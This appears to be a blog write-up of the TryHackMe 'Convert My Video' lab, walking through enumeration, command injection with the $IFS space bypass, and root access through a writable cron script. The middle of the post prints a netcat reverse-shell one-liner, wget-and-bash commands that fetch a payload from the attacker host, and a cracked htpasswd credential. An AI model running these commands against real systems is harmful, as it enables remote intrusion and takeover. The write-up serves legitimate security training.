---
layout: post
title: THM Convert My Video writeup
excerpt_separator: <!--more-->
---
<img src="/img/Convertmyvideo/0.head.png">
<!--more--> 
<p></p>
<a href="https://tryhackme.com/room/res" target="_blank" > Click here to access this box on tryHackMe.com</a>
<hr>


<p> Strat by enumerating  ports with a basic NMAP Scan.</p>
<p>Below we see that ports 22 and 80 are open. Let’s enumerate them further</p>
<img src="/img/Convertmyvideo/1.nmap-scan.png">

<p>We can see that ports 22 is running openSSH ver 7.6p1 and port 80 is running Apache 2.4.29. Next let’s use namp to scan all 65k ports. </p>
<img src="/img/Convertmyvideo/2.namp-scan-2.png">

<p>This will take awhile so while we wait let’s navigate over to port 80 in a web browser. </p>
<img src="/img/Convertmyvideo/3.namp-scan.png">

<p>There’s a simple page with a text box and a button that says convert. My first thought is to check the source code and use gobuster to find any hidden directories. First let start up gobuster.</p>
<img src="/img/Convertmyvideo/4.index-page.png">

<p>With gobuster I’m going to search for any files with a .txt,.php and .mp3 extension because of the clues on site. While that’s running let’s check source code and check back in on the nmap scan </p>
<img src="/img/Convertmyvideo/5.gobuster-start.png">

<p>Namp only shows ports 22 and 80 open. Next i’m going to review the websites source code.</p>
<img src="/img/Convertmyvideo/6.nmap-scan3.png">

<p>After spending some time  hours fuzzing the input I intercepted  the post request in burp suite and tried some basic command line injections.  I was able to successfully get a response back from the server by encapsulating the id command with backtick ( `id` ) not to be confused with single quotes (‘id’). Below is the output from the injection command in burp suite </p>
<img src="/img/Convertmyvideo/7.comand-line-injection.png">

<p>Something I struggled with for a bit was the command injection. It would not accept a space or tab so I could issue the command ‘ls’ but ‘ls -la’ would fail. I tried things like URL encoding the space (%20) `ls%20-ls`, but that didn;t work either. I needed to find an alternate argument separator. What ultimately ended up working was $IFS$9. The $IFS is an environmental variable  which is space by default. Additionally we add $9, which is just a holder of the ninth argument of the current system shell process (which is always an empty string). </p>
<img src="/img/Convertmyvideo/8.fuzzed-injection.png">

<p>Let’s see if we can get a nc reverse shell to call back to us. First we setup our listener on our local machine.</p>
<img src="/img/Convertmyvideo/9.nc-listen.png">

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.3.153 4444 >/tmp/f
`wget${IFS}10.13.3.153:7777/nc-revshell-oneline`
`bash${IFS}nc-revshell-oneline`
python -c 'import pty; pty.spawn("/bin/bash")'

itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/ = jessie

/var/www/html/admin/.htpasswd  

<p>Let’s try and upload a reverse shell file using php.</p>
<p>here is the php code I’m going to attempt to upload</p>
<img src="/img/Convertmyvideo/10.rev-shell-code.png">

<p>Now let's host this file on our local machine</p>
<img src="/img/Convertmyvideo/11.python-server.png">

<p>Back to burp suite let’s issue a wget to download the file to the victim machine</p>
<img src="/img/Convertmyvideo/12.wget-from-burp.png">

<p>Now when I tried to call the reverse shell code by abusing the command line injection command in burp suite (`./name-of-my-file’) it wouldn’t work.I’m assuming the period (.) in the command was causing the issue. What ultimately work was calling `bash${IFS}name-of-uploded-shell-code`</p>
<p> Below I setup a listener on my local machine </p> 
<p> And then issue the command line injection payload in burp suite</p>
<img src="/img/Convertmyvideo/13.lister-4444.png">
<img src="/img/Convertmyvideo/14.burp-command-calling-the-nc-file.png">

<p>Now we have a shell as www-data. Let’s cat the user flag and begin our enumeration for privesc.</p>
<img src="/img/Convertmyvideo/15.user-flag.png">

<p>Just poking around in the filesystem, I found a file name clean.sh. When I read out this file it just removed everything in the downloads folder. Although it doesn't show  cron job  was calling this - it seemed suspect. I thought I’d give it a shot while I kept enumerating, just in case. Since www-data was the owner of the file I changed the mode to 777 so I could modify this file  and change the bash command from ‘rm -fr downloads’ to the reverse shell one liner I used earlier - but with a different port. </p>
<img src="/img/Convertmyvideo/16.clean.sh-code.png">


<p>I’m not sure if it was just luck but almost instantly after setting up my nc listener on my local machine I got a call back and it was running as the root user.</p>
<img src="/img/Convertmyvideo/17.root.txt.png">

<p>This box took me a lot longer than expected. I spent about 4 hours on the initial shell, but I think I may have lucked out on the privesc. Overall, I enjoyed the box and learned something new along the way. Kudos to the creator,  </p> 
